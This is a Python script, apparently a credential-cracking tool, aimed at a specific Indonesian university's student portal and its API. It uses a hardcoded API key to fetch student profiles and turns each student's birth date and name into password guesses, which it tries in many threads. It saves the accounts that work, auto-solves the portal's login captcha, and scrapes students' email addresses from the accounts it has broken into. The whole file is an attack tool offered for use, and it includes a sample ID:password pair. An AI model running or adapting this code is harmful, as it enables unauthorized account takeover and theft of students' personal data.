import json
import datetime
from colorama import *
import requests as req
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor

key = "SF27xMjAL178GOUgDoQ1GzL6v4jGk99H"
live = []

def profil(nim):
	raw = req.get("http://api-sia.uty.ac.id/profil",headers={"nim":f"{nim}","q":key}).json()["SIA_RestAPI"]
	return raw

def buka(filepath):
	empass = open(filepath).read().splitlines()
	return empass

def emdecot(encodedString):
	r = int(encodedString[:2],16)
	email = ''.join([chr(int(encodedString[i:i+2], 16) ^ r) for i in range(2, len(encodedString), 2)])
	return email

def cek(empas):
	url = "http://api-sia.uty.ac.id/login"
	dat = empas.split(":")
	nim = dat[0]
	pwd = dat[1]
	hdr = {"u":nim,"p":pwd,"q":key}
	raw = req.get(url,headers=hdr).json()['SIA_RestAPI']
	
	if raw['status']:
		print(f"{Style.RESET_ALL} > {Fore.GREEN}{nim}{Style.RESET_ALL}:{Fore.GREEN}{pwd}")
		open('live.txt','a').write(f'{nim}:{pwd}\n')
		live.append(nim)
	else:
		print(end=f"{Style.RESET_ALL} - [{Fore.RED}{nim}{Style.RESET_ALL}] \r")

def convert(tanggal,nim):
	tgl,bln,thn = tanggal.split(" ")
	objek_bulan = datetime.datetime.strptime(bln, "%B")
	angka_bulan = objek_bulan.month
	return f"{tgl}{angka_bulan:02d}{thn}"

def main():
	print(f"\n\n     {Back.WHITE}{Fore.BLACK} UTY Fucker by YutixCode {Style.RESET_ALL}\n\n")
	print("[1] crack from nim \n"+
	"[2] check live empas\n")
	
	pilih = input("Yutix >> ")
	
	if pilih == "1":
		items = buka(input("Filepath >> "))
		thrds = int(input("Threads >> "))
		#thrds = 50
		#items = buka("live.txt")
		print()
		with ThreadPoolExecutor(max_workers=thrds) as yutix:
			for nim in items:
				try:
					tmp = []
					dat = profil(nim)["result"]["profile"]
					tmp.append(nim)
					tmp.append(dat["ttl"].split(", ")[0])
					tmp.append(convert(dat["ttl"].split(", ")[1],nim))
					for i in dat["nama_lengkap"].split(" "):
						tmp.append(i+'123')
						tmp.append(i)
					
					for i in tmp:
						yutix.submit(cek,f"{nim}:{i}")
				except Exception as err:
					#print(err)
					pass
		print(f"{Fore.BLACK}{Back.BLACK}"+"-"*25)
		print(f"{Style.RESET_ALL}Live: {Fore.GREEN}{len(live)}")
		
	elif pilih == "2":
		items = buka(input("Filepath >> "))
		thrds = int(input("Threads >> "))
		#thrds = 50
		#items = buka("live")
		print()
		with ThreadPoolExecutor(max_workers=thrds) as yutix:
			for empas in items:
				try:
					yutix.submit(cek,f"{empas}")
				except Exception as err:
					print(err)
					#pass
		print(f"{Fore.BLACK}{Back.BLACK}"+"-"*25)
		print(f"{Style.RESET_ALL}Live: {Fore.GREEN}{len(live)}")
	elif pilih == "3":
		items = buka(input("Filepath >> "))
		thrds = int(input("Threads >> "))
		#thrds = 50
		#items = buka("live")
		print()
		with ThreadPoolExecutor(max_workers=thrds) as yutix:
			for empas in items:
				try:
					yutix.submit(cekmail,f"{empas}")
				except Exception as err:
					print(err)

def mumet(key):
	x = key.split(' ')
	if x[0] == 'Coba':
		return int(x[2])+int(x[4])
	elif x[0] == 'Berapakah':
		return int(x[1])+int(list(x[3])[0])
	elif x[1] == 'ditambah':
		return int(x[0])+int(x[2])

def login(usr,pwd):
	url = 'https://sia.uty.ac.id/'
	ses = req.Session()
	raw = ses.get(url).text
	mmt = bs(raw,'html.parser').find('form').p.text.strip()
	dat = f'loginNipNim={usr}&loginPsw={pwd}&mumet={mumet(mmt)}'
	hdr = {'content-type':'application/x-www-form-urlencoded'}
	sed = ses.post(url,data=dat,headers=hdr).text
	
	if usr in sed:
		return ses
	else:
		return False

def cekmail(empas):
	nim, pwd = empas.split(":")
	sesi = login(nim,pwd)
	if sesi:
		resp = sesi.get('https://sia.uty.ac.id/std/emailstudent').text
		data = bs(resp,'html.parser')
		mail = emdecot(data.find("span",{"class":"__cf_email__"})["data-cfemail"])
		medu = data.find("h3",{"class":"text-primary myemailstudent"})
		
		if medu:
			edu = emdecot(medu.a["data-cfemail"])
			log = []
			clr = Fore.CYAN
			trp = "        "+"-"*len(edu)+"\n"
			
			for temp in data.find("tbody").findAll("tr"):
				logs = temp.findAll("td")
				span = logs[2].span['class'][1].split('-')[1]
				
				if span == "warning":
					stat = f"{Fore.BLACK}{Back.YELLOW} {logs[2].text.strip()} {Style.RESET_ALL}"
				elif span == "danger":
					stat = f"{Fore.BLACK}{Back.RED} {logs[2].text.strip()} {Style.RESET_ALL}"
				elif span == "success":
					stat = f"{Fore.BLACK}{Back.GREEN} {logs[2].text.strip()} {Style.RESET_ALL}"
				
				log.append(f"        {Style.DIM}{logs[1].text.strip()} {stat} \n")
		else:
			edu = False
			log = False
			clr = Fore.MAGENTA
			trp = ""
		
		print(f"""{Style.RESET_ALL}Nimpas: {clr}{empas}
{Style.RESET_ALL}E-mail: {clr}{mail}
{Style.RESET_ALL}S-mail: {clr}{''.join(edu) if edu else '-'}
{Style.RESET_ALL}{trp}{''.join(log) if log else ''}""")

#cek("5201711076:15091999")
main()